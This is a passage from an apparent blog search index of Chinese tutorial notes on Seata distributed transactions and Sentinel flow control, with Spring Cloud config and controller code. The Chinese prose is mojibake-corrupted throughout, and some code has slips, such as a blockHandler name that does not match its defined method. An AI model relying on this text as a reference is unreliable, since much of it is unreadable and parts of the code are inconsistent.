java.math.BigDecimal; import java.util.concurrent.TimeUnit; /** * è´¦æˆ·ä¸šåŠ¡å®ç°ç±» */ @Service public class AccountServiceImpl implements AccountService { private static final Logger LOGGER = LoggerFactory.getLogger(AccountServiceImpl.class); @Resource AccountDao accountDao; /** * æ‰£å‡è´¦æˆ·ä½™é¢ */ @Override public void decrease(Long userId, BigDecimal money) { LOGGER.info(&quot;-------&gt;account-serviceä¸­æ‰£å‡è´¦æˆ·ä½™é¢å¼€å§‹&quot;); try { TimeUnit.SECONDS.sleep(20); } catch (InterruptedException e) { e.printStackTrace(); } accountDao.decrease(userId,money); LOGGER.info(&quot;-------&gt;account-serviceä¸­æ‰£å‡è´¦æˆ·ä½™é¢ç»“æŸ&quot;); } } 9.Controller package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult ; import com.kayleh.springcloud.alibaba.service.AccountService ; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; import java.math.BigDecimal; @RestController public class AccountController { @Resource AccountService accountService; /** * æ‰£å‡è´¦æˆ·ä½™é¢ */ @RequestMapping(&quot;/account/decrease&quot;) public CommonResult decrease(@RequestParam(&quot;userId&quot;) Long userId, @RequestParam(&quot;money&quot;) BigDecimal money){ accountService.decrease(userId,money); return new CommonResult(200,&quot;æ‰£å‡è´¦æˆ·ä½™é¢æˆåŠŸï¼&quot;); } } 10.Configé…ç½® MyBatisConfig package com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan; import org.springframework.context.annotation.Configuration; @Configuration @MapperScan({&quot;com.kayleh.springcloud.alibaba.dao&quot;}) public class MyBatisConfig { } DataSourceProxyConfig ```javapackage com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource;import io.seata.rm.datasource.DataSourceProxy;import org.apache.ibatis.session.SqlSessionFactory;import org.mybatis.spring.SqlSessionFactoryBean;import org.mybatis.spring.transaction.SpringManagedTransactionFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import javax.sql.DataSource; @Configuration public class DataSourceProxyConfig { @Value(&quot;${mybatis.mapperLocations}&quot;) private String mapperLocations; @Bean @ConfigurationProperties(prefix = &quot;spring.datasource&quot;) public DataSource druidDataSource(){ return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); } } 11.ä¸»å¯åŠ¨ ```java package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @SpringBootApplication(exclude = DataSourceAutoConfiguration.class) @EnableDiscoveryClient @EnableFeignClients public class SeataAccountMainApp2003 { public static void main(String[] args) { SpringApplication.run(SeataAccountMainApp2003.class, args); } } Testä¸‹è®¢å•-&gt;å‡åº“å­˜-&gt;æ‰£ä½™é¢-&gt;æ”¹ï¼ˆè®¢å•ï¼‰çŠ¶æ€ 1598418701820 1598418752655 æ•°æ®åº“åˆå§‹æƒ…å†µ 1598418770944 æ­£å¸¸ä¸‹å• http://localhost:2001/order/create?userid=1&amp;producrid=1&amp;counr=10&amp;money=100 æ•°æ®åº“æƒ…å†µ 1598418805563 è¶…æ—¶å¼‚å¸¸ï¼Œæ²¡åŠ @GlobalTransactionalseata-order-service2003çš„decrease åœ¨accountDaoè°ƒç”¨decreaseä¹‹å‰ try{ TimeUnit.SECONDS.sleep(20); }catch(InterruptException e){ e.printStackTrace(); } AccountServiceImplæ·»åŠ è¶…æ—¶ æ•°æ®åº“æƒ…å†µ æ•…éšœæƒ…å†µ å½“åº“å­˜å’Œè´¦æˆ·ä½™é¢æ‰£å‡åï¼Œè®¢å•çŠ¶æ€å¹¶æ²¡æœ‰è®¾ç½®ä¸ºå·²ç»å®Œæˆï¼Œæ²¡æœ‰ä»é›¶æ”¹ä¸º1 è€Œä¸”ç”±äºfeignçš„é‡è¯•æœºåˆ¶ï¼Œè´¦æˆ·ä½™é¢è¿˜æœ‰å¯èƒ½è¢«å¤šæ¬¡æ‰£å‡ è¶…æ—¶å¼‚å¸¸ï¼Œæ·»åŠ @GlobalTransactionalorderServiceImpl @GlobalTransactional(name = &quot;fsp-create-order&quot;,rollbackFor = Exception.class) AccountServiceImplæ·»åŠ è¶…æ—¶ OrderServiceImpl@GlobalTransactional ä¸‹å•åæ•°æ®åº“æ•°æ®å¹¶æ²¡æœ‰ä»»ä½•æ”¹å˜ è®°å½•éƒ½æ·»åŠ ä¸è¿›æ¥ Seataä¹‹åŸç†ç®€ä»‹Seata 2019å¹´1æœˆä»½èš‚èšé‡‘æœå’Œé˜¿é‡Œå·´å·´å…±åŒå¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ Simple Extensible Autonomous Transaction Architecture,ç®€å•å¯æ‰©å±•è‡ªæ²»äº‹åŠ¡æ¡†æ¶ 2020èµ·åˆï¼Œå‚åŠ å·¥ä½œåç”¨1.0ä»¥åçš„ç‰ˆæœ¬ å†çœ‹TC/TM/RMä¸‰å¤§ç»„ä»¶1598419006224 åˆ†å¸ƒå¼äº‹åŠ¡çš„æ‰§è¡Œæµç¨‹ TMå¼€å¯åˆ†å¸ƒå¼äº‹åŠ¡(TMå‘TCæ³¨å†Œå…¨å±€äº‹åŠ¡è®°å½•) æ¢ä¸šåŠ¡åœºæ™¯ï¼Œç¼–æ’æ•°æ®åº“ï¼ŒæœåŠ¡ç­‰äº‹åŠ¡å†…èµ„æºï¼ˆRMå‘TCæ±‡æŠ¥èµ„æºå‡†å¤‡çŠ¶æ€ï¼‰ TMç»“æŸåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œäº‹åŠ¡ä¸€é˜¶æ®µç»“æŸï¼ˆTMé€šçŸ¥TCæäº¤/å›æ»šåˆ†å¸ƒå¼äº‹åŠ¡ï¼‰ TCæ±‡æ€»äº‹åŠ¡ä¿¡æ¯ï¼Œå†³å®šåˆ†å¸ƒå¼äº‹åŠ¡æ˜¯æäº¤è¿˜æ˜¯å›æ»š TCé€šçŸ¥æ‰€æœ‰RMæäº¤/å›æ»šèµ„æºï¼Œäº‹åŠ¡äºŒé˜¶æ®µç»“æŸã€‚ ATæ¨¡å¼å¦‚ä½•åšåˆ°å¯¹ä¸šåŠ¡çš„æ— ä¾µå…¥æ˜¯ä»€ä¹ˆ 1598419068562 1598419095784 ä¸€é˜¶æ®µåŠ è½½ 1598419109689 1598419122066 äºŒé˜¶æ®µæäº¤ 1598419138114 äºŒé˜¶æ®µå›æ»š 1598419157493 1598419170919 debug è¡¥å……1598419193998 1598419205394\" style=\"zoom: 80%;","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Sentinelå®ç°ç†”æ–­ä¸é™æµ","slug":"Sentinelå®ç°ç†”æ–­ä¸é™æµ","date":"2020-08-24T05:18:27.000Z","updated":"2021-04-11T17:11:28.416Z","comments":true,"path":"Sentinelå®ç°ç†”æ–­ä¸é™æµ/","link":"","permalink":"https://blog.kayleh.top/Sentinel%E5%AE%9E%E7%8E%B0%E7%86%94%E6%96%AD%E4%B8%8E%E9%99%90%E6%B5%81/","excerpt":"Sentinel","text":"Sentinel æ˜¯ä»€ä¹ˆHystrix ä¸‹è½½https://github.com/alibaba/Sentinel/releases 1598275246796 æ€ä¹ˆä½¿ç”¨ï¼Ÿhttps://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_sentinel æœåŠ¡ä½¿ç”¨ä¸­çš„å„ç§é—®é¢˜ æœåŠ¡é›ªå´© æœåŠ¡é™çº§ æœåŠ¡ç†”æ–­ æœåŠ¡é™æµ å®‰è£…Sentinelæ§åˆ¶å°sentinelç»„ä»¶ç”±2éƒ¨åˆ†ç»„æˆ1598275337431 åå° å‰å°8080 å®‰è£…æ­¥éª¤ä¸‹è½½ https://github.com/alibaba/Sentinel/releases ä¸‹è½½åˆ°æœ¬åœ°sentinel-dashboard-1.7.0.jar è¿è¡Œå‘½ä»¤å‰æ: java8ç¯å¢ƒOK 8080ç«¯å£ä¸èƒ½è¢«å ç”¨ å‘½ä»¤: java -jar sentinel-dashboard-1.7.0.jar è®¿é—®sentinelç®¡ç†ç•Œé¢ http://localhost:8080 ç™»å½•è´¦å·å¯†ç å‡ä¸ºsentinel åˆå§‹åŒ–æ¼”ç¤ºå·¥ç¨‹å¯åŠ¨Nacos8848æˆåŠŸ http://localhost:8848/nacos/#/login Modulecloudalibaba-sentinel-service8401POM &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;4.6.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; YMLserver: port: 8401 spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: #nacosæœåŠ¡æ³¨å†Œä¸­å¿ƒåœ°å€ server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 #é»˜è®¤8719ï¼Œå‡å¦‚è¢«å ç”¨äº†ä¼šè‡ªåŠ¨ä»8719å¼€å§‹ä¾æ¬¡+1æ‰«æã€‚ç›´è‡³æ‰¾åˆ°æœªè¢«å ç”¨çš„ç«¯å£ management: endpoints: web: exposure: include: &#39;*&#39; ä¸»å¯åŠ¨package com.atguigu.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient @SpringBootApplication public class MainApp8401 { public static void main(String[] args) { SpringApplication.run(MainApp8401.class, args); } } ä¸šåŠ¡ç±»FlowLimitControllerpackage com.atguigu.springcloud.alibaba.controller; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class FlowLimitController { @GetMapping(&quot;/testA&quot;) public String testA() { return &quot;------testA&quot;; } @GetMapping(&quot;/testB&quot;) public String testB() { return &quot;------testB&quot;; } } å¯åŠ¨Sentinel8080java -jar sentinel-dashboard-1.7.0 å¯åŠ¨å¾®æœåŠ¡8401å¯åŠ¨8401å¾®æœåŠ¡åæŸ¥çœ‹sentienlæ§åˆ¶å°ç©ºç©ºå¦‚ä¹Ÿï¼Œå•¥éƒ½æ²¡æœ‰ Sentinelé‡‡ç”¨çš„æ‡’åŠ è½½è¯´æ˜æ‰§è¡Œä¸€æ¬¡è®¿é—®å³å¯ http://localhost:8401/testA http://localhost:8401/testB æ•ˆæœ1598275789442 ç»“è®ºsentinel8080æ­£åœ¨ç›‘æ§å¾®æœåŠ¡8401 æµæ§è§„åˆ™åŸºæœ¬ä»‹ç»1598275892803 è¿›ä¸€æ­¥è§£é‡Šè¯´æ˜ 1598275917235 1598275930554 æµæ§æ¨¡å¼ç›´æ¥ï¼ˆé»˜è®¤ï¼‰ç›´æ¥-&gt;å¿«é€Ÿå¤±è´¥ ç³»ç»Ÿé»˜è®¤ é…ç½®åŠè¯´æ˜æµ‹è¯•å¿«é€Ÿç‚¹å‡»è®¿é—®http://localhost:8401/testA ç»“æœ Blocked by Sentinel (flow limiting) æ€è€ƒï¼Ÿï¼Ÿï¼Ÿ ç›´æ¥è°ƒç”¨é»˜è®¤æŠ¥é”™ä¿¡æ¯ï¼ŒæŠ€æœ¯æ–¹é¢OK butï¼Œæ˜¯å¦åº”è¯¥æœ‰æˆ‘ä»¬è‡ªå·±çš„åç»­å¤„ç†ï¼Ÿ ç±»ä¼¼æœ‰ä¸€ä¸ªfallbackçš„å…œåº•æ–¹æ³•ï¼Ÿ å…³è”æ˜¯ä»€ä¹ˆï¼Ÿå½“å…³è”çš„èµ„æºè¾¾åˆ°é˜ˆå€¼æ—¶ï¼Œå°±é™æµè‡ªå·± å½“ä¸Aå…³è”çš„èµ„æºBè¾¾åˆ°é˜ˆå€¼åï¼Œå°±é™æµè‡ªå·± Bæƒ¹äº‹ï¼ŒAæŒ‚äº† é…ç½®A1598276511243 postmanæ¨¡æ‹Ÿå¹¶å‘å¯†é›†è®¿é—®testBå…ˆæŠŠè¯·æ±‚save asï¼Œä¿å­˜åˆ°Collections 1598276562818 è®¿é—®testBæˆåŠŸ postmané‡Œæ–°å»ºå¤šçº¿ç¨‹é›†åˆç»„ å°†è®¿é—®åœ°å€æ·»åŠ è¿›æ–°çº¿ç¨‹ç»„ Run å¤§æ‰¹é‡çº¿ç¨‹é«˜å¹¶å‘è®¿é—®Bï¼Œå¯¼è‡´Aå¤±æ•ˆäº† è¿è¡Œåå‘ç°testAæŒ‚äº† ç‚¹å‡»è®¿é—®http://localhost:8401/testA ç»“æœ Blocked by Sentinel (flow limiting) é“¾è·¯å¤šä¸ªè¯·æ±‚è°ƒç”¨äº†åŒä¸€ä¸ªå¾®æœåŠ¡ å®¶åº­ä½œä¸šè¯•è¯• æµæ§æ•ˆæœç›´æ¥-&gt;å¿«é€Ÿå¤±è´¥ï¼ˆé»˜è®¤çš„æµæ§å¤„ç†ï¼‰ç›´æ¥å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ Blocked by Sentinel (flow limiting) æºç  com.alibaba.csp.sentinel.slots.block.flow.controller.DefaultController é¢„çƒ­è¯´æ˜ å…¬å¼ï¼šé˜ˆå€¼é™¤ä»¥coldFactorï¼ˆé»˜è®¤å€¼ä¸º3ï¼‰ï¼Œç»è¿‡é¢„çƒ­æ—¶é•¿åæ‰ä¼šè¾¾åˆ°é˜ˆå€¼ å®˜ç½‘ é»˜è®¤coldFactorä¸º3ï¼Œå³è¯·æ±‚QPSä»threshold/3å¼€å§‹ï¼Œç»é¢„çƒ­æ—¶é•¿é€æ¸å‡è‡³è®¾å®šçš„QPSé˜ˆå€¼ã€‚ é™æµ å†·å¯åŠ¨ https://github.com/alibaba/Sentinel/wiki/%E9%99%90%E6%B5%81---%E5%86%B7%E5%90%AF%E5%8A%A8 æºç com.alibaba.csp.sentinel.slots.block.flow.controller.WarmUpController 1598276768339 Warmupé…ç½®1598277103340 å¤šæ¬¡ç‚¹å‡»http://localhost:8401/testB åˆšå¼€å§‹ä¸è¡Œï¼Œåç»­æ…¢æ…¢OK åº”ç”¨åœºæ™¯1598277148535 æ’é˜Ÿç­‰å¾…1598276768339 åŒ€é€Ÿæ’é˜Ÿï¼Œé˜ˆå€¼å¿…é¡»è®¾ç½®ä¸ºQPSå®˜ç½‘æºç com.alibaba.csp.sentinel.slots.block.flow.controller.RateLimiterController æµ‹è¯•testBåœ¨æ§åˆ¶å°è¾“å‡ºæ—¥å¿—sl4j log.info(thread.currentThread.getName()+&quot;\\t&quot;+&quot;...testB&quot;) 1598277222170 é™çº§è§„åˆ™åŸºæœ¬ä»‹ç»1598277395163 1598277412123 è¿›ä¸€æ­¥è¯´æ˜ Sentinelçš„æ–­è·¯å™¨æ˜¯æ²¡æœ‰åŠå¼€çŠ¶æ€çš„ åŠå¼€çš„çŠ¶æ€ç³»ç»Ÿè‡ªåŠ¨å»æ£€æµ‹æ˜¯å¦è¯·æ±‚æœ‰å¼‚å¸¸ï¼Œæ²¡æœ‰å¼‚å¸¸å°±å…³é—­æ–­è·¯å™¨æ¢å¤ä½¿ç”¨ï¼Œæœ‰å¼‚å¸¸åˆ™ç»§ç»­æ‰“å¼€æ–­è·¯å™¨ä¸å¯ç”¨ã€‚å…·ä½“å¯ä»¥å‚è€ƒHystrix å¤ä¹ Hystrix 1598277556742 1598277592247 é™çº§ç­–ç•¥å®æˆ˜RTæ˜¯ä»€ä¹ˆ?1598277795422 1598277815933 æµ‹è¯•ä»£ç  @GetMapping(&quot;/testD&quot;) public String testD() { try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } log.info(&quot;testD æµ‹è¯•RT&quot;); return &quot;------testD&quot;; } é…ç½® 1598277885759 jmeterå‹æµ‹ ç»“è®º 1598277904111 1598277918812 å¼‚å¸¸æ¯”ä¾‹æ˜¯ä»€ä¹ˆ 1598277953235 1598277965489 æµ‹è¯• ä»£ç  @GetMapping(&quot;/testD&quot;) public String testD() { log.info(&quot;testD æµ‹è¯•RT&quot;); int age = 10/0; return &quot;------testD&quot;; } é…ç½® 1598278071559 jmeter 1598278103683 ç»“è®º 1598278121021 å¼‚å¸¸æ•°æ˜¯ä»€ä¹ˆ 1598278157875 1598278172535 å¼‚å¸¸æ•°æ˜¯æŒ‰ç…§åˆ†é’Ÿç»Ÿè®¡çš„ æµ‹è¯• ä»£ç  @GetMapping(&quot;/testE&quot;) public String testE() { log.info(&quot;testE æµ‹è¯•å¼‚å¸¸æ•°&quot;); int age = 10/0; return &quot;------testE æµ‹è¯•å¼‚å¸¸æ•°&quot;; } é…ç½® http://localhost:8401/testE 1598278242551 jmeter çƒ­ç‚¹keyé™æµåŸºæœ¬ä»‹ç»æ˜¯ä»€ä¹ˆ 1598281015660 https://github.com/alibaba/Sentinel/wiki/çƒ­ç‚¹å‚æ•°é™æµ æ‰¿ä¸Šå¯ä¸‹å¤ä¹ start1598281047415 @SentinelResource ä»£ç @GetMapping(&quot;/testHotKey&quot;) @SentinelResource(value = &quot;testHotKey&quot;,blockHandler = &quot;deal_testHotKey&quot;) public String testHotKey(@RequestParam(value = &quot;p1&quot;,required = false) String p1, @RequestParam(value = &quot;p2&quot;,required = false) String p2) { //int age = 10/0; return &quot;------testHotKey&quot;; } //å…œåº•æ–¹æ³• public String deal_testHotKey (String p1, String p2, BlockException exception){ return &quot;------deal_testHotKey,o(â•¥ï¹â•¥)o&quot;; } com.alibaba.csp.sentinel.slots.block.BlockException é…ç½®é…ç½® 1598281119051 1 @SentinelResource(value = â€œtestHotKeyâ€) å¼‚å¸¸æ‰“åˆ°äº†å‰å°ç”¨æˆ·ç•Œé¢çœ‹ä¸åˆ°ï¼Œä¸å‹å¥½ 2 @SentinelResource(value = â€œtestHotKeyâ€,blockHandler = â€œdeal_testHotKeyâ€) æ–¹æ³•testHostKeyé‡Œé¢ç¬¬ä¸€ä¸ªå‚æ•°åªè¦QPSè¶…è¿‡æ¯ç§’1æ¬¡ï¼Œé©¬ä¸Šé™çº§å¤„ç† ç”¨äº†æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ æµ‹è¯• :x: error http://localhost:8401/testHotKey?p1=abc :x: error http://localhost:8401/testHotKey?p1=abc&amp;p2=33 :heavy_check_mark: right http://localhost:8401/testHotKey?p2=abc å‚æ•°ä¾‹å¤–é¡¹ä¸Šè¿°æ¡ˆä¾‹æ¼”ç¤ºäº†ç¬¬ä¸€ä¸ªå‚æ•°p1,å½“QPSè¶…è¿‡1ç§’1æ¬¡ç‚¹å‡»åé©¬ä¸Šè¢«é™æµ ç‰¹æ®Šæƒ…å†µ æ™®é€š è¶…è¿‡1ç§’é’Ÿä¸€ä¸ªåï¼Œè¾¾åˆ°é˜ˆå€¼1åé©¬ä¸Šè¢«é™æµ æˆ‘ä»¬æœŸæœ›p1å‚æ•°å½“å®ƒæ˜¯æŸä¸ªç‰¹æ®Šå€¼æ—¶ï¼Œå®ƒçš„é™æµå€¼å’Œå¹³æ—¶ä¸ä¸€æ · ç‰¹ä¾‹ å‡å¦‚å½“p1çš„å€¼ç­‰äº5æ—¶ï¼Œå®ƒçš„é˜ˆå€¼å¯ä»¥è¾¾åˆ°200 é…ç½® 1598281694486 1598281694486 æ·»åŠ æŒ‰é’®ä¸èƒ½å¿˜ æµ‹è¯• :heavy_check_mark: http://localhost:8401/testHotKey?p1=5 :x:http://localhost:8401/testHotKey?p1=3 å½“p1ç­‰äº5çš„æ—¶å€™ï¼Œé˜ˆå€¼å˜ä¸º200 å½“p1ä¸ç­‰äº5çš„æ—¶å€™ï¼Œé˜ˆå€¼å°±æ˜¯å¹³å¸¸çš„1 å‰ææ¡ä»¶çƒ­ç‚¹å‚æ•°çš„æ³¨æ„ç‚¹ï¼Œå‚æ•°å¿…é¡»æ˜¯åŸºæœ¬ç±»å‹æˆ–è€…String å…¶ä»–,æ·»åŠ å¼‚å¸¸çœ‹çœ‹â€¦. 1598281913264 ç³»ç»Ÿè§„åˆ™æ˜¯ä»€ä¹ˆï¼Ÿ https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81 å„é¡¹é…ç½®å‚æ•°è¯´æ˜ 1598337022929 é…ç½®å…¨å±€QPS @SentinelResourceæŒ‰èµ„æºåç§°é™æµ+åç»­å¤„ç†å¯åŠ¨NacosæˆåŠŸ å¯åŠ¨SentinelæˆåŠŸ Module cloudalibaba-sentinel-service8401 POM &lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; yml server: port: 8401 spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 #é»˜è®¤8719ï¼Œå‡å¦‚è¢«å ç”¨äº†ä¼šè‡ªåŠ¨ä»8719å¼€å§‹ä¾æ¬¡+1æ‰«æã€‚ç›´è‡³æ‰¾åˆ°æœªè¢«å ç”¨çš„ç«¯å£ management: endpoints: web: exposure: include: &#39;*&#39; ä¸šåŠ¡ç±»RateLimitController package com.atguigu.springcloud.alibaba.controller; import com.alibaba.csp.sentinel.annotation.SentinelResource; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.atguigu.springcloud.entities.*; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class RateLimitController { @GetMapping(&quot;/byResource&quot;) @SentinelResource(value = &quot;byResource&quot;,blockHandler = &quot;handleException&quot;) public CommonResult byResource() { return new CommonResult(200,&quot;æŒ‰èµ„æºåç§°é™æµæµ‹è¯•OK&quot;,new Payment(2020L,&quot;serial001&quot;)); } public CommonResult handleException(BlockException exception) { return new CommonResult(444,exception.getClass().getCanonicalName()+&quot;\\t æœåŠ¡ä¸å¯ç”¨&quot;); } ä¸»å¯åŠ¨ package com.atguigu.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient @SpringBootApplication public class MainApp8401 { public static void main(String[] args) { SpringApplication.run(MainApp8401.class, args); } } é…ç½®æµæ§è§„åˆ™ é…ç½®æ­¥éª¤ 1598337203454 å›¾å½¢é…ç½®å’Œä»£ç å…³ç³» è¡¨ç¤º1ç§’é’Ÿå†…æŸ¥è¯¢æ¬¡æ•°å¤§äº1ï¼Œå°±è·‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„å¤„æµï¼Œé™æµ æµ‹è¯• 1ç§’é’Ÿç‚¹å‡»1ä¸‹ï¼ŒOK è¶…è¿‡ä¸Šè¿°é—®é¢˜ï¼Œç–¯ç‹‚ç‚¹å‡»ï¼Œè¿”å›äº†è‡ªå·±å®šä¹‰çš„é™æµå¤„ç†ä¿¡æ¯ï¼Œé™æµå‘é€ 1598337235793 é¢å¤–é—®é¢˜ æ­¤æ—¶å…³é—­å¾®æœåŠ¡8401çœ‹çœ‹ Sentinelæ§åˆ¶å°ï¼Œæµæ§è§„åˆ™æ¶ˆå¤±äº†ï¼Ÿï¼Ÿ ä¸´æ—¶/æŒä¹…ï¼Ÿ æŒ‰ç…§Urlåœ°å€é™æµ+åç»­å¤„ç†é€šè¿‡è®¿é—®çš„URLæ¥é™æµï¼Œä¼šè¿”å›Sentinelè‡ªå¸¦é»˜è®¤çš„é™æµå¤„ç†ä¿¡æ¯ ä¸šåŠ¡ç±»RateLimitController @GetMapping(&quot;/rateLimit/byUrl&quot;) @SentinelResource(value = &quot;byUrl&quot;) public CommonResult byUrl() { return new CommonResult(200,&quot;æŒ‰urlé™æµæµ‹è¯•OK&quot;,new Payment(2020L,&quot;serial002&quot;)); } è®¿é—®ä¸€æ¬¡ Sentinelæ§åˆ¶å°é…ç½® 1598337354555 æµ‹è¯• ç–¯ç‹‚ç‚¹å‡»http://localhost:8401/rateLimit/byUrl 1598337380401 ä¸Šé¢å…œåº•æ–¹æ³•é¢ä¸´çš„é—®é¢˜1598337405346 å®¢æˆ·è‡ªå®šä¹‰é™æµå¤„ç†é€»è¾‘åˆ›å»ºcustomerBlockHandlerç±»ç”¨äºè‡ªå®šä¹‰é™æµå¤„ç†é€»è¾‘ è‡ªå®šä¹‰é™æµå¤„ç†ç±» CustomerBlockHandler 1598337444808 package com.atguigu.springcloud.alibaba.myhandler; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.atguigu.springcloud.entities.*; public class CustomerBlockHandler { public static CommonResult handleException(BlockException exception) { return new CommonResult(2020, &quot;è‡ªå®šä¹‰é™æµå¤„ç†ä¿¡æ¯....CustomerBlockHandler&quot;); } } RateLimitController @GetMapping(&quot;/rateLimit/customerBlockHandler&quot;) @SentinelResource(value = &quot;customerBlockHandler&quot;, blockHandlerClass = CustomerBlockHandler.class, blockHandler = &quot;handlerException2&quot;) public CommonResult customerBlockHandler() { return new CommonResult(200,&quot;æŒ‰å®¢æˆ¶è‡ªå®šä¹‰&quot;,new Payment(2020L,&quot;serial003&quot;)); } å¯åŠ¨å¾®æœåŠ¡åå…ˆè°ƒç”¨ä¸€æ¬¡ http://localhost:8401/rateLimit/customerBlockHandler Sentinelæ§åˆ¶å°é…ç½® æµ‹è¯•åæˆ‘ä»¬è‡ªå®šä¹‰çš„å‡ºæ¥äº† è¿›ä¸€æ­¥è¯´æ˜: 1598337533657 æ›´å¤šæ³¨è§£å±æ€§è¯´æ˜1598337561019 1598337573475 å¤šè¯´ä¸€å¥ 1598337587461 Sentinelä¸»è¦æœ‰ä¸‰ä¸ªæ ¸å¿ƒAPI SphUå®šä¹‰èµ„æº Tracerå®šä¹‰ç»Ÿè®¡ ContextUtilå®šä¹‰äº†ä¸Šä¸‹æ–‡ æœåŠ¡ç†”æ–­åŠŸèƒ½sentinelæ•´åˆribbon+openFeign+fallbackRibbonç³»åˆ—å¯åŠ¨nacoså’Œsentinelæä¾›è€…9003/9004 æ–°å»ºcloudalibaba-provider-payment9003/9004 POM &lt;dependencies&gt; &lt;!--SpringCloud ailibaba nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; 